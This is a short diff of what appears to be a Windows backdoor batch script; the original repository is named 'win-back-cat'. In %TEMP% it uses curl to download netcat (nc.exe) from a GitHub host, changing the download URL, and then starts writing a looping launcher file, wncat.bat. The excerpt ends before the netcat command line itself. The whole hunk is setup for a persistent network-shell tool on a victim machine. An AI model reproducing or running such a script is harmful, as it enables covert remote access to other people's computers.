@@ -2,7 +2,7 @@
 
 cd %TEMP%
 
-curl https://raw.githubusercontent.com/RAF-87/win-back-cat/main/files/nc.exe > nc.exe
+curl https://github.com/diegocr/netcat/blob/master/nc.exe > nc.exe
 
 echo @echo off > wncat.bat
 echo :loop >> wncat.bat
